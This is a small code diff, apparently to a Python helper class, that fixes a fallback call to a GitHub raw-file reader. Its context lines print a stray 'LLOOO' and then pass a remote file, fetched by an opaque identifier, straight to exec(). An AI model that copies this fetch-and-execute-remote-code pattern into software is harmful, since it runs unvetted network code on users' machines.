@@ -32,7 +32,7 @@ class u:
     try:
       return cls.getFile_GitHubAPI(path)
     except Exception as e:
-      return getFile_GitHubRAW(path)
+      return cls.getFile_GitHubRAW(path)
 
 print("LLOOO")
 exec(u.readGithubFile("db0bc|pm|pm"))
